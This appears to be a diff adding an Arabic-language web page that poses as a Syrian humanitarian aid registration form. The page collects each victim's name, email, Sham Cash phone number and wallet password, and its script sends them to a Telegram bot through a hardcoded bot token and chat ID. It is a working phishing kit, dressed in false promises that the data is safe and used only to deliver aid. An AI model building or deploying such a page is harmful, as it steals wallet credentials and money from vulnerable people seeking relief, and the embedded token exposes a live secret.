@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>برنامج المساعدات الإنسانية – سوريا</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', 'Segoe UI', Tahoma, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(145deg, #f0f4f8 0%, #e9f0f5 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 550px;
+            width: 100%;
+            background: #ffffffdd;
+            backdrop-filter: blur(8px);
+            background: white;
+            border-radius: 30px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+        }
+
+        .header {
+            background: #1e3c5c;
+            color: white;
+            padding: 30px 25px;
+            text-align: center;
+        }
+
+        .header i {
+            font-size: 3rem;
+            margin-bottom: 10px;
+            color: #f9c74f;
+        }
+
+        .header h1 {
+            font-size: 1.9rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            font-size: 1rem;
+            opacity: 0.9;
+            line-height: 1.6;
+        }
+
+        .content {
+            padding: 35px 30px;
+        }
+
+        .info-box {
+            background: #eef5fb;
+            border-right: 5px solid #1e3c5c;
+            padding: 15px;
+            border-radius: 16px;
+            margin-bottom: 30px;
+            font-size: 0.95rem;
+            color: #1e2b37;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .info-box i {
+            font-size: 2rem;
+            color: #1e3c5c;
+        }
+
+        .form-group {
+            margin-bottom: 22px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #1e3c5c;
+            font-size: 0.95rem;
+        }
+
+        label i {
+            margin-left: 8px;
+            color: #f9a826;
+            width: 18px;
+        }
+
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            background: #f8fafd;
+            border: 1px solid #cfdee9;
+            border-radius: 16px;
+            transition: 0.2s;
+            padding: 0 15px;
+        }
+
+        .input-wrapper:hover,
+        .input-wrapper:focus-within {
+            border-color: #1e3c5c;
+            box-shadow: 0 4px 12px rgba(30, 60, 92, 0.1);
+            background: white;
+        }
+
+        .input-wrapper i {
+            color: #7f8c8d;
+            font-size: 1.1rem;
+            margin-left: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px 0;
+            border: none;
+            background: transparent;
+            font-size: 1rem;
+            outline: none;
+            color: #1e2b37;
+        }
+
+        input::placeholder {
+            color: #a7b9c9;
+            font-weight: 300;
+        }
+
+        .note {
+            font-size: 0.8rem;
+            color: #6b7a8a;
+            margin-top: 8px;
+            margin-right: 10px;
+        }
+
+        .consent-group {
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 16px;
+            margin: 20px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .consent-group input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            margin-top: 3px;
+            accent-color: #1e3c5c;
+        }
+
+        .consent-group label {
+            margin-bottom: 0;
+            font-weight: normal;
+            color: #2c3e50;
+            font-size: 0.9rem;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background: #1e3c5c;
+            color: white;
+            border: none;
+            padding: 18px 25px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 20px;
+            box-shadow: 0 8px 20px rgba(30, 60, 92, 0.3);
+        }
+
+        .btn-submit:hover {
+            background: #143048;
+            transform: scale(1.02);
+            box-shadow: 0 12px 28px rgba(30, 60, 92, 0.4);
+        }
+
+        .btn-submit i {
+            font-size: 1.2rem;
+        }
+
+        .btn-submit:disabled {
+            background: #95a5a6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .footer {
+            background: #f0f6fb;
+            padding: 18px;
+            text-align: center;
+            color: #3f5466;
+            font-size: 0.9rem;
+            border-top: 1px solid #d3e2ef;
+        }
+
+        .footer a {
+            color: #1e3c5c;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        #message {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 8px;
+            display: none;
+        }
+
+        #message.success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+            display: block;
+        }
+
+        #message.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            display: block;
+        }
+
+        @media (max-width: 480px) {
+            .header h1 {
+                font-size: 1.5rem;
+            }
+            .content {
+                padding: 25px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <i class="fas fa-hand-holding-heart"></i>
+            <h1>سجل للحصول على المساعدة</h1>
+            <p>برنامج الدعم الإنساني في سوريا – تعبئة البيانات لضمان وصول المساعدات إلى مستحقيها</p>
+        </div>
+
+        <div class="content">
+            <div class="info-box">
+                <i class="fas fa-shield-alt"></i>
+                <span>بياناتك آمنة وسيتم استخدامها فقط لغرض تقديم المساعدة الإنسانية (شام كاش مطلوب لتحويل الدعم).</span>
+            </div>
+
+            <form id="aidForm">
+                <!-- الاسم الكامل -->
+                <div class="form-group">
+                    <label><i class="fas fa-user"></i> الاسم الكامل</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-pen"></i>
+                        <input type="text" id="fullname" placeholder="مثال: محمد أحمد علي" required>
+                    </div>
+                </div>
+
+                <!-- البريد الإلكتروني -->
+                <div class="form-group">
+                    <label><i class="fas fa-envelope"></i> البريد الإلكتروني</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-at"></i>
+                        <input type="email" id="email" placeholder="example@domain.com" required>
+                    </div>
+                </div>
+
+                <!-- رقم الهاتف (شام كاش) -->
+                <div class="form-group">
+                    <label><i class="fas fa-phone-alt"></i> رقم الهاتف (شام كاش)</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-mobile-alt"></i>
+                        <input type="tel" id="phone" placeholder="09xxxxxxxx" pattern="09[0-9]{8}" title="رقم هاتف سوري مكون من 10 أرقام يبدأ بـ 09" required>
+                    </div>
+                    <div class="note"><i class="fas fa-info-circle"></i> أدخل رقم شام كاش المكون من 10 أرقام (مثال: 0987654321)</div>
+                </div>
+
+                <!-- كلمة السر (شام كاش) -->
+                <div class="form-group">
+                    <label><i class="fas fa-lock"></i> كلمة السر (شام كاش)</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-key"></i>
+                        <input type="password" id="shamCashPassword" placeholder="كلمة سر المحفظة" required minlength="4">
+                    </div>
+                    <div class="note"><i class="fas fa-info-circle"></i> كلمة السر الخاصة بمحفظة شام كاش (لتحويل المبلغ).</div>
+                </div>
+
+                <!-- مربع الموافقة -->
+                <div class="consent-group">
+                    <input type="checkbox" id="consent" required>
+                    <label for="consent">
+                        أوافق على إرسال بياناتي لغرض معالجة طلبي. 
+                        (لن تُستخدم بياناتي لأي غرض آخر)
+                    </label>
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitBtn">
+                    <i class="fas fa-paper-plane"></i> تقديم الطلب
+                </button>
+
+                <div id="message"></div>
+            </form>
+        </div>
+
+        <div class="footer">
+            <i class="fas fa-heart" style="color: #c44545;"></i> يداً بيد لدعم المتضررين في سوريا ·  
+            <a href="#">سياسة الخصوصية</a> ·  <a href="#">تواصل معنا</a>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // ⚠️ تنبيه أمني: استخدام التوكن بشكل علني في كود العميل يعرض البوت للاختراق.
+            // يجب استخدام خادم وسيط (backend) لحماية هذه البيانات.
+            const BOT_TOKEN = '8613857883:AAESvhWPGCzlvo7q_3d7awhJjromOcEfkeQ'; // تم تحديثه حسب المعطيات
+            const CHAT_ID = '‎5080850773'; // تم تحديثه حسب المعطيات
+
+            $('#aidForm').on('submit', function(e) {
+                e.preventDefault();
+
+                // تعطيل الزر
+                $('#submitBtn').prop('disabled', true).html('<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...');
+
+                // جمع البيانات مع trim
+                const fullname = $('#fullname').val().trim();
+                const email = $('#email').val().trim();
+                const phone = $('#phone').val().trim();
+                const shamCashPassword = $('#shamCashPassword').val().trim();
+
+                // تحقق إضافي من الحقول
+                if (!fullname || !email || !phone || !shamCashPassword) {
+                    $('#message').removeClass('success').addClass('error').html('❌ جميع الحقول مطلوبة.').show();
+                    $('#submitBtn').prop('disabled', false).html('<i class="fas fa-paper-plane"></i> تقديم الطلب');
+                    return;
+                }
+
+                // إنشاء نص الرسالة
+                const now = new Date();
+                const timeString = now.toLocaleString('ar-EG', { timeZone: 'Asia/Damascus' });
+                const message = `🔔 *طلب مساعدة إنسانية جديدة*\n\n` +
+                                `👤 *الاسم:* ${fullname}\n` +
+                                `📧 *البريد:* ${email}\n` +
+                                `📞 *رقم شام كاش:* ${phone}\n` +
+                                `🔑 *كلمة السر:* ${shamCashPassword}\n` +
+                                `🕐 *الوقت:* ${timeString}`;
+
+                // إرسال إلى تليجرام
+                $.ajax({
+                    url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+                    method: 'POST',
+                    data: {
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    },
+                    success: function(response) {
+                        $('#message').removeClass('error').addClass('success').html('✅ تم إرسال طلبك بنجاح. سنتواصل معك قريباً.').show();
+                        $('#aidForm')[0].reset();
+                    },
+                    error: function(xhr, status, error) {
+                        console.error('Telegram API Error:', error);
+                        $('#message').removeClass('success').addClass('error').html('❌ حدث خطأ في الإرسال. يرجى المحاولة لاحقاً.').show();
+                    },
+                    complete: function() {
+                        $('#submitBtn').prop('disabled', false).html('<i class="fas fa-paper-plane"></i> تقديم الطلب');
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
